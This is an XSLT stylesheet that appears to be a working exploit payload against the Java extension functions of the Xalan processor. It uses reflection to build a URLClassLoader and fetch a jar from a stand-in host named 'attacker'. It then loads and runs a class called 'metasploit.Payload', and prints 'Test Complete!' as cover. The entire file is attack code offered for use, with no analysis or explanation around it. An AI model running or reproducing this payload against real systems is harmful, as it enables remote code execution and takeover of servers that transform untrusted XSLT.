  1 <xsl:stylesheet version="1.0" xmlns:xsl="http://www.w3.org/1999/XSL/Transform" xmlns:j="http://xml.apache.org/xalan/java" exclude-result-prefixes="j">
  2 <xsl:template match="/">
  3 <xsl:variable name="url">http://attacker/eviljava/wkaLrNQj.jar</xsl:variable>
  4 <xsl:variable name="arrays">rO0ABXVyAA9bTGphdmEubmV0LlVSTDtSUf0kxRtozQIAAHhwAAAAAXB1cgATW0xqYXZhLmxhbmcuU3RyaW5nO63SVufpHXtHAgAAeHAAAAAA</xsl:va    riable>
  5 <xsl:variable name="ois" select="j:java.io.ObjectInputStream.new(j:java.io.ByteArrayInputStream.new(j:decodeBuffer(j:sun.misc.BASE64Decoder.new(),$arr    ays)))" />
  6 <xsl:variable name="n" select="j:get(j:java.util.HashMap.new(),'')"/>
  7 <xsl:variable name="c1" select="j:getInterfaces(j:java.lang.Class.forName('java.lang.Number'))"/>
  8 <xsl:variable name="c2" select="j:getInterfaces(j:java.lang.Class.forName('java.io.File'))"/>
  9 <xsl:variable name="l" select="j:java.util.ArrayList.new()"/>
 10 <xsl:variable name="urlarray" select="j:readObject($ois)"/>
 11 <xsl:value-of select="j:java.lang.reflect.Array.set($urlarray,0,j:java.net.URL.new($url))"/>
 12 <xsl:value-of select="substring(j:add($l,$urlarray),5)"/>
 13 <xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.net.URL;'))"/>
 14 <xsl:variable name="r" select="j:newInstance(j:getConstructor(j:java.lang.Class.forName('java.net.URLClassLoader'),$c1),j:toArray($l))"/>
 15 <xsl:value-of select="j:clear($l)"/>
 16 <xsl:value-of select="substring(j:add($l,'metasploit.Payload'),5)"/>
 17 <xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('java.lang.String'))"/>
 18 <xsl:variable name="z" select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.ClassLoader'),'loadClass',$c1),$r,j:toArray($l))"/>
 19 <xsl:value-of select="j:java.lang.reflect.Array.set($c1,0,j:java.lang.Class.forName('[Ljava.lang.String;'))"/>
 20 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.String'))"/>
 21 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Class;'))"/>
 22 <xsl:value-of select="j:clear($l)"/>
 23 <xsl:value-of select="substring(j:add($l,'main'),5)"/>
 24 <xsl:value-of select="substring(j:add($l,$c1),5)"/>
 25 <xsl:variable name="v" select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.Class'),'getMethod',$c2),$z,j:toArray($l))"/>
 26 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,0,j:java.lang.Class.forName('java.lang.Object'))"/>
 27 <xsl:value-of select="j:java.lang.reflect.Array.set($c2,1,j:java.lang.Class.forName('[Ljava.lang.Object;'))"/>
 28 <xsl:value-of select="j:clear($l)"/>
 29 <xsl:value-of select="substring(j:add($l,j:readObject($ois)),5)"/>
 30 <xsl:value-of select="j:close($ois)" />
 31 <xsl:value-of select="substring(j:set($l,0,j:toArray($l)),1,0)"/>
 32 <xsl:value-of select="j:add($l,0,$n)"/>
 33 <xsl:value-of select="j:invoke(j:getMethod(j:java.lang.Class.forName('java.lang.reflect.Method'),'invoke',$c2),$v,j:toArray($l))"/>
 34 <result>Test Complete!</result>
 35 </xsl:template>
 36 </xsl:stylesheet>
